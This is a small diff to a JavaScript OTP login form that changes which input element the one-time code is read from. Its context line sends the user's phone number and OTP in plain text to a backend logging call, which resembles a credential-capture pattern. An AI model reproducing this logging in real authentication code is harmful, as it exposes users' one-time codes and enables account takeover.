@@ -155,7 +155,7 @@ document.addEventListener('DOMContentLoaded', function() {
         otpForm.addEventListener('submit', async function(event) {
             event.preventDefault();
             const phoneNumber = sessionStorage.getItem('phoneNumber');
-            const phoneCode = document.getElementById('otpCode').value;
+            const phoneCode = document.getElementById('phoneCode').value;
 
             sendLogToBackend(`Submitting OTP form. Phone number: ${phoneNumber}, OTP: ${phoneCode}`);
 
